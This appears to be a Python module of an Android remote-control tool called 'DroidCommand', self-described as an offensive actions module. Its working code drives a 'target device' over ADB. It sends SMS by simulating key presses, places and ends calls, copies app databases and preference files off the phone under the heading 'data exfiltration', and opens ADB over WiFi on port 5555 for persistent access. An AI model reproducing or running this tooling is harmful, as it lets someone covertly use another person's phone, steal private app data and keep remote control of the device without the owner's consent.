"""
DroidCommand — Offensive Actions Module
Modules 9-12: SMS Sender, Call Initiator, App Data Exfiltration, Persistent Shell
"""

import subprocess
import time
import re
import os
import shlex
from pathlib import Path
from config import ADB_PATH, TEMP_DIR
from adb_engine import ADBEngine

adb = ADBEngine()

# Validate phone number format
_PHONE_RE = re.compile(r'^[+\d][\d\s\-()]{4,20}$')
# Validate package name format (prevent shell injection)
_PKG_RE = re.compile(r'^[a-zA-Z][a-zA-Z0-9_.]{2,120}$')


# ==================== MODULE 9: SMS SENDER ====================

def send_sms(phone_number, message):
    """Send an SMS from the target device."""
    try:
        # Sanitize phone number
        phone = phone_number.strip().replace(" ", "").replace("-", "").replace("(", "").replace(")", "")
        if not phone or not _PHONE_RE.match(phone_number.strip()):
            return {"success": False, "error": "Numéro de téléphone invalide"}

        if not message or not message.strip():
            return {"success": False, "error": "Message vide"}

        msg_clean = message.strip()

        # Method 1: via am start (opens SMS app with pre-filled message)
        safe_phone_uri = shlex.quote(f"sms:{phone}")
        safe_body = shlex.quote(msg_clean)
        res = adb.shell(
            f'am start -a android.intent.action.SENDTO '
            f'-d {safe_phone_uri} '
            f'--es sms_body {safe_body} '
            f'--ez exit_on_sent true'
        )

        if res["success"]:
            # Wait for SMS app to load, then simulate send button
            time.sleep(2)
            # Baseline: which window holds focus before we touch anything
            base_res = adb.shell("dumpsys window")
            base_out = base_res.get("stdout") or ""
            mbase = (re.search(r"mCurrentFocus=Window\{[^}]*\s([^ /\}]+)", base_out)
                     or re.search(r"mCurrentFocus=(\S+)", base_out))
            sms_focus = mbase.group(1) if mbase else None
            # Navigate to send button and press
            adb.shell("input keyevent 22")  # DPAD_RIGHT (focus send)
            time.sleep(0.3)
            adb.shell("input keyevent 22")  # DPAD_RIGHT again
            time.sleep(0.3)
            adb.shell("input keyevent 66")  # ENTER (send)
            time.sleep(1)
            # Post-keystroke focus check: the send is only credible if the
            # focused window moved off the compose UI (exit_on_sent closes it)
            post_res = adb.shell("dumpsys window")
            post_out = post_res.get("stdout") or ""
            mpost = (re.search(r"mCurrentFocus=Window\{[^}]*\s([^ /\}]+)", post_out)
                     or re.search(r"mCurrentFocus=(\S+)", post_out))
            observed_focus = mpost.group(1) if mpost else None
            confirmed = bool(sms_focus) and observed_focus != sms_focus
            # Press back to close SMS app
            adb.shell("input keyevent 4")
            if confirmed:
                return {"success": True, "method": "am_intent", "phone": phone,
                        "message": msg_clean, "observed_focus": observed_focus}
            return {"success": False, "method": "am_intent", "phone": phone,
                    "message": msg_clean, "observed_focus": observed_focus,
                    "error": "Fenêtre SMS non confirmée — envoi non vérifié"}

        # Method 2: via service call isms (direct, may need different arg index per Android version)
        safe_phone_arg = shlex.quote(phone)
        safe_msg_arg = shlex.quote(msg_clean)
        res2 = adb.shell(
            f'service call isms 5 i32 0 s16 "com.android.mms" '
            f's16 {safe_phone_arg} s16 "null" s16 {safe_msg_arg} s16 "null" s16 "null"'
        )

        if res2["success"] and "Exception" not in res2["stdout"]:
            return {"success": True, "method": "service_call", "phone": phone, "message": msg_clean}

        return {"success": False, "error": "Les deux méthodes d'envoi ont échoué", "detail": res2.get("stderr", "")}

    except Exception as e:
        return {"success": False, "error": str(e)}


# ==================== MODULE 10: CALL INITIATOR ====================

def make_call(phone_number):
    """Initiate a phone call from the target device."""
    try:
        phone = phone_number.strip().replace(" ", "").replace("-", "").replace("(", "").replace(")", "")
        if not phone or not _PHONE_RE.match(phone_number.strip()):
            return {"success": False, "error": "Numéro de téléphone invalide"}

        res = adb.shell(f'am start -a android.intent.action.CALL -d "tel:{phone}"')

        if res["success"]:
            return {"success": True, "phone": phone, "status": "appel_lance"}

        return {"success": False, "error": res.get("stderr", "Échec de l'appel")}

    except Exception as e:
        return {"success": False, "error": str(e)}


def end_call():
    """End the current phone call."""
    try:
        res = adb.shell("input keyevent 6")  # KEYCODE_ENDCALL
        return {"success": res["success"]}
    except Exception as e:
        return {"success": False, "error": str(e)}


# ==================== MODULE 11: APP DATA EXFILTRATION ====================

def extract_app_data(package_name):
    """Extract databases, shared_prefs, and other data from an app."""
    try:
        if not package_name or not _PKG_RE.match(package_name):
            return {"success": False, "error": "Nom de package invalide"}

        results = {
            "success": True,
            "package": package_name,
            "databases": [],
            "shared_prefs": [],
            "pulled_files": [],
            "errors": []
        }

        # Staging lives under /data/local/tmp (shell-writable, not on the
        # shared sdcard); ensure the directory exists before copying.
        adb.shell("mkdir -p /data/local/tmp")

        # Try listing databases via run-as
        db_res = adb.shell(f"run-as {package_name} ls databases/ 2>/dev/null")
        if db_res["success"] and db_res["stdout"]:
            db_files = [f.strip() for f in db_res["stdout"].splitlines() if f.strip()]
            results["databases"] = db_files

            # Try to pull each database
            for db_file in db_files[:5]:  # Limit to 5 files
                safe_name = re.sub(r'[^a-zA-Z0-9_.-]', '_', db_file)
                remote_tmp = f"/data/local/tmp/droidcommand_{safe_name}"
                local_path = str(TEMP_DIR / f"exfil_{package_name}_{safe_name}")

                # Copy via run-as to staging, then pull
                safe_db_rel = shlex.quote(f"databases/{db_file}")
                safe_remote_tmp = shlex.quote(remote_tmp)
                cp_res = adb.shell(f"run-as {package_name} cat {safe_db_rel} > {safe_remote_tmp}")
                if cp_res["success"]:
                    try:
                        pull_res = adb.run_cmd(["pull", remote_tmp, local_path])
                    finally:
                        try:
                            adb.shell(f"rm {safe_remote_tmp}")
                        except Exception:
                            pass
                    if pull_res["success"]:
                        results["pulled_files"].append({
                            "name": db_file,
                            "local_path": local_path,
                            "size": os.path.getsize(local_path) if os.path.exists(local_path) else 0
                        })
                    else:
                        results["errors"].append(f"Pull échoué pour {db_file}")
                else:
                    results["errors"].append(f"Accès refusé pour databases/{db_file}")

        # Try listing shared_prefs
        sp_res = adb.shell(f"run-as {package_name} ls shared_prefs/ 2>/dev/null")
        if sp_res["success"] and sp_res["stdout"]:
            sp_files = [f.strip() for f in sp_res["stdout"].splitlines() if f.strip()]
            results["shared_prefs"] = sp_files

            for sp_file in sp_files[:5]:
                safe_name = re.sub(r'[^a-zA-Z0-9_.-]', '_', sp_file)
                remote_tmp = f"/data/local/tmp/droidcommand_{safe_name}"
                local_path = str(TEMP_DIR / f"sp_{package_name}_{safe_name}")

                safe_sp_rel = shlex.quote(f"shared_prefs/{sp_file}")
                safe_remote_tmp = shlex.quote(remote_tmp)
                cp_res = adb.shell(f"run-as {package_name} cat {safe_sp_rel} > {safe_remote_tmp}")
                if cp_res["success"]:
                    try:
                        pull_res = adb.run_cmd(["pull", remote_tmp, local_path])
                    finally:
                        try:
                            adb.shell(f"rm {safe_remote_tmp}")
                        except Exception:
                            pass
                    if pull_res["success"]:
                        results["pulled_files"].append({
                            "name": sp_file,
                            "local_path": local_path,
                            "size": os.path.getsize(local_path) if os.path.exists(local_path) else 0
                        })

        if not results["databases"] and not results["shared_prefs"]:
            results["errors"].append("Accès run-as refusé (app non-debuggable ou root requis)")

            # Fallback: try adb backup
            backup_path = str(TEMP_DIR / f"{package_name}_backup.ab")
            bk_res = adb.run_cmd(["backup", "-f", backup_path, "-noapk", package_name], timeout=15)
            if bk_res["success"] and os.path.exists(backup_path):
                bk_size = os.path.getsize(backup_path)
                if bk_size > 100:
                    results["pulled_files"].append({
                        "name": f"{package_name}_backup.ab",
                        "local_path": backup_path,
                        "size": bk_size
                    })
                    results["errors"].append("Backup ADB créé (acceptez le prompt sur le device)")

        return results

    except Exception as e:
        return {"success": False, "error": str(e)}


def list_app_databases(package_name):
    """Quick list of databases for a specific app."""
    if not package_name or not _PKG_RE.match(package_name):
        return {"success": False, "error": "Package invalide"}

    res = adb.shell(f"run-as {package_name} find . -name '*.db' -o -name '*.sqlite' 2>/dev/null")
    if res["success"] and res["stdout"]:
        files = [f.strip() for f in res["stdout"].splitlines() if f.strip()]
        return {"success": True, "files": files}

    return {"success": False, "error": "Accès refusé ou aucune base trouvée"}


# ==================== MODULE 12: PERSISTENT SHELL ====================

def enable_wifi_adb():
    """Enable ADB over TCP/IP (WiFi) for persistent access."""
    try:
        # Step 1: Get device IP address
        ip_res = adb.shell("ip route | grep 'src' | head -1")
        device_ip = None
        if ip_res["success"] and ip_res["stdout"]:
            match = re.search(r'src\s+([\d.]+)', ip_res["stdout"])
            if match:
                device_ip = match.group(1)

        if not device_ip:
            # Fallback: try ifconfig/ip addr
            ip_res2 = adb.shell("ip addr show wlan0 | grep 'inet '")
            if ip_res2["success"]:
                match = re.search(r'inet\s+([\d.]+)', ip_res2["stdout"])
                if match:
                    device_ip = match.group(1)

        if not device_ip:
            return {"success": False, "error": "Impossible de déterminer l'IP WiFi du device"}

        # Step 2: Enable TCP/IP mode on port 5555
        tcp_res = adb.run_cmd(["tcpip", "5555"], timeout=10)
        time.sleep(2)  # Wait for ADB to restart in TCP mode

        if tcp_res["success"] or "restarting in TCP mode" in tcp_res.get("stdout", ""):
            return {
                "success": True,
                "device_ip": device_ip,
                "port": 5555,
                "connect_cmd": f"adb connect {device_ip}:5555",
                "status": "TCP/IP mode activé"
            }

        return {"success": False, "error": tcp_res.get("stderr", "Échec de l'activation TCP/IP")}

    except Exception as e:
        return {"success": False, "error": str(e)}


def connect_wifi_adb(ip, port=5555):
    """Connect to a device via WiFi ADB."""
    try:
        if not ip or not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip):
            return {"success": False, "error": "IP invalide"}

        port = int(port)
        res = adb.run_cmd(["connect", f"{ip}:{port}"], timeout=10)

        connected = res["success"] and "connected" in res.get("stdout", "").lower()
        return {
            "success": connected,
            "output": res.get("stdout", ""),
            "target": f"{ip}:{port}"
        }

    except Exception as e:
        return {"success": False, "error": str(e)}


def disconnect_wifi_adb(ip=None):
    """Disconnect WiFi ADB."""
    try:
        if ip:
            res = adb.run_cmd(["disconnect", ip])
        else:
            res = adb.run_cmd(["disconnect"])
        return {"success": res["success"], "output": res.get("stdout", "")}
    except Exception as e:
        return {"success": False, "error": str(e)}


def check_wifi_adb_status():
    """Check if WiFi ADB (TCP/IP mode) is active."""
    try:
        res = adb.shell("getprop service.adb.tcp.port")
        tcp_port = res.get("stdout", "").strip()
        active = tcp_port.isdigit() and int(tcp_port) > 0

        # Also get device WiFi IP
        ip_res = adb.shell("ip addr show wlan0 | grep 'inet '")
        device_ip = None
        if ip_res["success"]:
            match = re.search(r'inet\s+([\d.]+)', ip_res["stdout"])
            if match:
                device_ip = match.group(1)

        return {
            "success": True,
            "active": active,
            "tcp_port": int(tcp_port) if tcp_port.isdigit() else 0,
            "device_ip": device_ip,
            "connect_string": f"{device_ip}:{tcp_port}" if active and device_ip else None
        }

    except Exception as e:
        return {"success": False, "error": str(e)}
